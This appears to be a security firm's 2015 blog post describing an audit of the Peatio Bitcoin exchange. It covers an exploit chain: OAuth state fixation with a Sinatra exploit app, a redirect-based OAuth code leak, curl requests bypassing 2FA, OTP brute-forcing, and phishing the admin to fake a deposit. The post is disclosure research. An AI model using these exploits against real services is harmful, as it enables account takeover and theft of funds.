@@ -1,0 +1,360 @@
+
+<!doctype html>
+<html class="no-js" xmlns="https://www.w3.org/1999/xhtml"
+      xmlns:fb="https://ogp.me/ns/fb#">
+<head>
+<base href="https://sakurity.com" />
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Hacking a Bitcoin Exchange</title>
+
+    <meta name="description" content="We do penetration testing, source code auditing and vulnerability assessments">
+    <meta name="keywords"
+          content="Billing Security, Ruby on Rails Security, OAuth Security, Bitcoin Security, Framework Vulnerabilities">
+
+
+    <link rel="icon" type="image/x-icon" href="/images/favicon.ico"/>
+    <link rel="stylesheet" href="/styles/vendor.css"/>
+    <link rel="stylesheet" href="/styles/main.css"/>
+<meta property="og:image" content="https://www.sakurity.com/images/sakurity-logo@2x.png" />
+
+
+  <link rel="canonical" href="https://sakurity.com/blog/2015/01/10/hacking-bitcoin-exchanger.html">
+  <link rel="alternate" type="application/rss+xml" title="The Sakurity Blog" href="https://sakurity.com/blog/feed.xml" />
+
+
+
+
+
+
+</head>
+
+<body>
+
+
+<!--[if lt IE 10]>
+<p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade
+    your browser</a> to improve your experience.</p>
+<![endif]-->
+
+<nav class="top-bar row" data-topbar>
+    <section class="top-bar-section">
+
+        <ul class="left">
+            <li><a href="/">Home</a></li>
+            <li><a href="/blog">Blog</a></li>
+            <li><a href="/research">Research</a></li>
+            <li><a href="/contact">Contact Us</a></li>
+            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+        </ul>
+
+    </section>
+</nav>
+    <div class="page-content">
+      <div class="wrapper">
+
+<div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Hacking a Bitcoin Exchange</h1>
+  </header>
+
+  <article class="post-content">
+<p>UPDATE: Once again - no one was hacked in reality and the audit was conducted for free. This post is simply an attack scenario. <a href="https://sakurity.com/blog/2015/01/22/peatio-audit.html">You can download the final report and see clarifications here.</a></p>
+
+<p>For a while we’ve been looking for a project to conduct volunteer security audit. Recently we found a perfect suit for us - <a href="https://www.peat.io/">an open source crypto currency exchange Peatio</a> powered by Rails.</p>
+
+<p>We dedicated 8 hours to find a way to do the worst you can do with a Bitcoin exchange - steal the hot wallet. The mission was partially accomplished and we found an interesting chain of critical vulnerabilities.</p>
+
+<h2 id="step-1-hijacking-the-account">Step 1. Hijacking the account</h2>
+
+<p><img src="https://sakurity.com/img/weibo.png" alt="" /></p>
+
+<p>Peatio has “Connect Weibo account” feature built-in. According to <a href="https://oauthsecurity.com">OAuth Security Cheatsheet</a>, poorly implemented OAuth is a reliable way to take over an account.</p>
+
+<h5 id="connecting-attackers-weibo-account-to-the-victims-peatio-account">Connecting attacker’s weibo account to the victim’s Peatio account</h5>
+
+<p><a href="https://github.com/beenhero/omniauth-weibo-oauth2/pull/12">omniauth-weibo-oauth2</a> gem was vulnerable to state fixation. We can set state to arbitrary value (e.g. 123) and apply the attacker’s code instead along with state=123, which will lead to assigning attacker’s weibo  to victim’s peatio account. The exact same issue was in <a href="https://github.com/mkdynamic/omniauth-facebook/wiki/CSRF-vulnerability:-CVE-2013-4562">omniauth-facebook gem</a> and <a href="https://github.com/search?q=support+omniauth-oauth2+auto+csrf+protection&amp;ref=searchresults&amp;type=Code&amp;utf8=%E2%9C%93">others omniauth-based libraries</a> copypasting same vulnerable code. It’s funny that the comment above says <strong>“to support omniauth-oauth2’s auto csrf protection”</strong> but does the opposite and <a href="/img/codecomments.png">switches it off</a>.</p>
+
+<p>The bug can be exploited with following Sinatra app, just add YourWeiboCookies:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">'sinatra'</span>
+<span class="n">get</span> <span class="s1">'/get_weibo_cb'</span> <span class="k">do</span>
+
+  <span class="n">conn</span> <span class="o">=</span> <span class="no">Faraday</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="ss">:url</span> <span class="o">=&gt;</span> <span class="s1">'https://api.weibo.com'</span><span class="p">)</span>
+  <span class="n">new_url</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">get</span> <span class="k">do</span> <span class="o">|</span><span class="n">r</span><span class="o">|</span>
+    <span class="n">r</span><span class="p">.</span><span class="nf">url</span> <span class="s2">"/oauth2/authorize?client_id=456519107&amp;redirect_uri=https%3A%2F%2Fyunbi.com%2Fauth%2Fweibo%2Fcallback&amp;response_type=code&amp;state=123"</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'Cookie'</span><span class="p">]</span> <span class="o">=&lt;&lt;</span><span class="no">COOKIE</span><span class="sh">
+YourWeiboCookies
+</span><span class="no">COOKIE</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="nf">options</span><span class="p">.</span><span class="nf">timeout</span> <span class="o">=</span> <span class="mi">4</span>        
+    <span class="n">r</span><span class="p">.</span><span class="nf">options</span><span class="p">.</span><span class="nf">open_timeout</span> <span class="o">=</span> <span class="mi">2</span>
+  <span class="k">end</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s2">"Location"</span><span class="p">]</span>
+  <span class="n">redirect</span> <span class="n">new_url</span>
+<span class="k">end</span>
+
+<span class="n">get</span> <span class="s1">'/peatio_demo'</span> <span class="k">do</span>
+  <span class="n">response</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'Content-Security-Policy'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"img-src 'self' https://yunbi.com"</span>
+  <span class="s2">"&lt;img src='https://yunbi.com/auth/weibo?state=123'&gt;&lt;img src='/get_weibo_cb'&gt;"</span>
+<span class="k">end</span></code></pre></figure>
+
+<h5 id="what-if-the-user-already-has-weibo-connected">What if the user already has Weibo connected?</h5>
+
+<p>The system is not going to connect another Weibo account but we wanted the exploit to work seamlessly for every possible victim. So we hacked Weibo’s OAuth.</p>
+
+<p>First, we found out Weibo doesn’t whitelist <code class="highlighter-rouge">redirect_uri</code> like <a href="https://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html">Github didn’t</a>. It’s possible to change <code class="highlighter-rouge">redirect_uri</code> to another page on the victim domain to leak the <code class="highlighter-rouge">code</code> in the Referrer header and then use it to log in victim’s account.</p>
+
+<p>However there was no such page on Peatio to make it leak. No external images, links or anything. The attack surface was so tiny. But then we found this in <code class="highlighter-rouge">DocumentsController</code>:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>if not @doc
+  redirect_to(request.referer || root_path)
+  return
+end
+</code></pre>
+</div>
+
+<p>Following chain of redirects leaks the code by putting it in the <code class="highlighter-rouge">#</code> fragment first.</p>
+
+<ol>
+  <li><code class="highlighter-rouge">attacker_page</code> redirects to <code class="highlighter-rouge">weibo.com/authorize?...redirect_uri=https://app/documents/not_existing_doc%23...</code></li>
+  <li>Weibo doesn’t properly parse <code class="highlighter-rouge">redirect_uri</code> and redirects the victim to <code class="highlighter-rouge">https://app/documents/not_existing_doc#?code=VALID_CODE</code></li>
+  <li>Peatio cannot find <code class="highlighter-rouge">not_existing_doc</code> and sends back Location header equal request.referer which is still attacker_page (the browser retains this header while gets redirected)</li>
+  <li>The browser preserves <code class="highlighter-rouge">#?code=VALID_CODE</code> fragment and loads <code class="highlighter-rouge">attacker_page#?code=VALID_CODE</code>. Now the code can be leaked with JS via <code class="highlighter-rouge">location.hash</code> variable. The code can be used against <code class="highlighter-rouge">https://app/auth/weibo/callback</code> to log in the victim’s account.</li>
+</ol>
+
+<p>So using two bugs above we can hijack any peatio account and only last one requires JS.</p>
+
+<h2 id="step-2-bypassing-2-factor-authentication">Step 2: Bypassing 2 Factor Authentication</h2>
+
+<h5 id="for-users-with-google-authenticator-activated">For users with Google Authenticator activated</h5>
+
+<p><img src="https://sakurity.com/img/ga.png" alt="" /></p>
+
+<p>There’s a gaping hole in SmsAuthsController - <code class="highlighter-rouge">two_factor_required!</code> is only called for <code class="highlighter-rouge">show</code> action, but not for <code class="highlighter-rouge">update</code> which is actually responsible for activating SMS 2FA.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>before_action :auth_member!
+before_action :find_sms_auth
+before_action :activated?
+before_action :two_factor_required!, only: [:show]
+
+def show
+  @phone_number = Phonelib.parse(current_user.phone_number).national
+end
+
+def update
+  if params[:commit] == 'send_code'
+    send_code_phase
+  else
+    verify_code_phase
+  end
+end
+</code></pre>
+</div>
+
+<p>We can activate new SMS authenticator simply sending following requests straight to <code class="highlighter-rouge">update</code> action.</p>
+
+<p>curl ‘https://app/verify/sms_auth’ -H ‘X-CSRF-Token:ZPwrQuLJ3x7md3wolrCTE6HItxkwOiUNHlekDPRDkwI=’ 
+-H ‘Cookie:_peatio_session=SID’ 
+–data ‘_method=patch&amp;sms_auth%5Bcountry%5D=DE&amp;sms_auth%5B
+phone_number%5D=9123222211&amp;commit=send_code’</p>
+
+<p><img src="https://sakurity.com/img/success.png" alt="" /></p>
+
+<p>curl ‘https://app/verify/sms_auth’ -H ‘X-CSRF-Token:ZPwrQuLJ3x7md3wolrCTE6HItxkwOiUNHlekDPRDkwI=’
+-H ‘Cookie:_peatio_session=SID’ –data ‘_method=patch&amp;sms_auth%5Bcountry%5D=DE&amp;sms_auth%5B
+phone_number%5D=9123222211&amp;sms_auth%5Botp%5D=CODE_WE_RECEIVED’</p>
+
+<p><img src="https://sakurity.com/img/verified.png" alt="" /></p>
+
+<h5 id="for-users-with-both-authenticator-and-sms">For users with both Authenticator and SMS</h5>
+
+<p><img src="https://sakurity.com/img/both.png" alt="" /></p>
+
+<p>Peatio doesn’t store failed attempts for OTP so it’s very easy to bruteforce both App and SMS OTPs, it will take less than 3 days. For more details check our <a href="https://sakurity.com/otp">OTP Bruteforce Calculator</a></p>
+
+<p><img src="https://sakurity.com/img/brute.png" alt="" /></p>
+
+<h5 id="for-users-with-sms-2fa-only">For users with SMS 2FA only</h5>
+
+<p><code class="highlighter-rouge">two_factor_by_type</code> method doesn’t use <code class="highlighter-rouge">activated</code> scope so even inactive 2FA models can be used. Thus we are not going to brute SMS auth because the victim will start receiving suspicious SMS. We still can bruteforce Google Authenticator because it has seed generated and <code class="highlighter-rouge">verify?</code> method is working fine.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>def two_factor_by_type
+  current_user.two_factors.by_type(params[:id])
+end
+</code></pre>
+</div>
+
+<h5 id="furthermore-sms-2fa-has-two-more-issues">Furthermore, SMS 2FA has two more issues</h5>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>def gen_code
+  self.otp_secret = OTP_LENGTH.times.map{ Random.rand(9) + 1 }.join
+  self.refreshed_at = Time.now
+end
+</code></pre>
+</div>
+
+<p>First issue is <code class="highlighter-rouge">Random.rand</code> is based on PRNG (Mersenne Twister) which is easily predictable once you have enough subsequently generated numbers.</p>
+
+<p>Second issue is <code class="highlighter-rouge">rand(9)</code> can only generate numbers from 0 to 8 so total number of combinations will be 9^6=531441 almost twice less than 1,000,000 and twice easier to bruteforce than App 2FA.</p>
+
+<p>With tricks outlined above we can bypass 2FA for any user. In worst case scenario it takes less than 3 days. If the victim has only Google Authenticator it takes less than 5 seconds to set up new SMS authenticator.</p>
+
+<h2 id="step-3-attacking-the-admin">Step 3: Attacking the admin</h2>
+
+<p>Alright, we can hijack the account and bypass 2FA for any user, so we can steal the Bitcoins from anyone who visits our page. Still we need a lot of users to trick into clicking our phishy links. Let’s focus on just one of them - the admin.</p>
+
+<p>The simplest way to make the admin visit our link is to create a support ticket with something like “What is wrong with my account can you please check? https://i.will.hack.you/now”. Then we hack 2FA to get into the <code class="highlighter-rouge">/admin</code> panel:</p>
+
+<p><img src="https://sakurity.com/img/admin.png" alt="" /></p>
+
+<p>Unfortunately, this is the worst part. The admin of Peatio can do just few more things  than a regular user. Nothing like “Send all the coins to this bad guy” or “Show API keys of all users”.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>  can :update, Proof
+  can :manage, Document
+  can :manage, Member
+  can :manage, Ticket
+  can :manage, IdDocument
+  can :manage, TwoFactor
+  can :menu, Deposit
+  can :manage, Deposit
+  can :manage, ::Deposits::Bank
+  can :manage, ::Deposits::Satoshi
+  can :menu, Withdraw
+  can :manage, ::Withdraws::Bank
+  can :manage, ::Withdraws::Satoshi
+</code></pre>
+</div>
+
+<p>The only thing we found is creating a fiat deposit of like 99999999 Chinese Yuan and then accepting it by an admin.</p>
+
+<p><img src="https://sakurity.com/img/yuan.png" alt="" /></p>
+
+<p>Then we can buy all available Bitcoins and altcoins to withdraw them. However not all Bitcoins are on orders. Doing it in stealth mode for a week can bring better results than closing all the orders in rush mode.</p>
+
+<p>Yunbi assets: <a href="https://yunbi.com/exchange_assets">1636 BTC in total and ~350 in the hot wallet</a></p>
+
+<p>Our bounty: 1 BTC. It wasn’t about money though.</p>
+
+<p>Finally, the report is <a href="https://sakurity.com/peatio.pdf">available to download</a>.</p>
+
+
+<p><a href="https://twitter.com/share" class="twitter-share-button" data-url="https://sakurity.com/blog/2015/01/10/hacking-bitcoin-exchanger.html" data-text="Hacking a Bitcoin Exchange" data-via="sakuritynetwork" data-related="sakuritynetwork">Share on Twitter</a>
+<script>
+!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');
+</script></p>
+
+<h3>Jan 10, 2015 • Egor Homakov (<a href='https://twitter.com/homakov'>@homakov</a>)</h3>
+
+
+<h3 class="rss-subscribe">Subscribe to our blog via <a href="https://twitter.com/SakurityNetwork">Twitter @SakurityNetwork</a>, <a href="/blog/feed.xml">RSS</a> or <a href="https://feedrabbit.com/subscriptions/new?url=https://sakurity.com/blog/feed.xml">Email</a></h3>
+  </article>
+
+
+
+
+
+
+<div id="spot-im-frame-inpage" data-post-id=""></div>
+
+
+</div></div>
+
+
+
+<div class="content">
+
+<!--<section class="inverse contact-us">
+
+    <div class="row">
+        <div class="small-12 small-text-center columns">
+            <h2>Trusted by</h2>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.coinbase.com/">
+            <div class="client client-coinbase"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.airbnb.com/">
+            <div class="client client-airbnb"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://stripe.com/">
+                <div class="client client-stripe"></div>
+            </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.uber.com/">
+            <div class="client client-uber"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://mixpanel.com/">
+            <div class="client client-mixpanel"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://wordpress.com/">
+            <div class="client client-wordpress"></div>
+          </a>
+        </div>
+    </div>
+
+
+    <div class="section-pattern">    
+        <div class="row">
+            <div class="small-10 small-centered small-text-center columns">
+
+                <p>Reach out to us if you want to see how our security audits can
+                    help your business,<br> or if you have any questions.</p>
+            </div>
+        </div>
+        <div class="row">
+            <div class="small-12 small-centered columns small-text-center">
+                <a href="/contact" class="button large pull success">Contact</a>
+            </div>
+        </div>
+    </div>
+</section>-->
+
+</div>
+
+
+
+<footer>
+    <div class="row">
+        <div class="small-6 medium-3 large-2 columns">
+            <h4>Sakurity</h4>
+            <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/blog">Blog</a></li>
+            <li><a href="/research">Research</a></li>
+            <li><a href="/contact">Contact Us</a></li>
+            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+            </ul>
+        </div>
+
+
+
+        <div class="small-12 medium-6 large-8 small-text-center medium-text-right columns">
+            <div class="logo-monochrome"></div>
+            <p class="copyright">Sakurity Ltd, a Hong Kong company established in 2012.<br><a href="mailto:info@sakurity.com">info@sakurity.com</a></p>
+        </div>
+    </div>
+</footer>
+</body>
+</html>
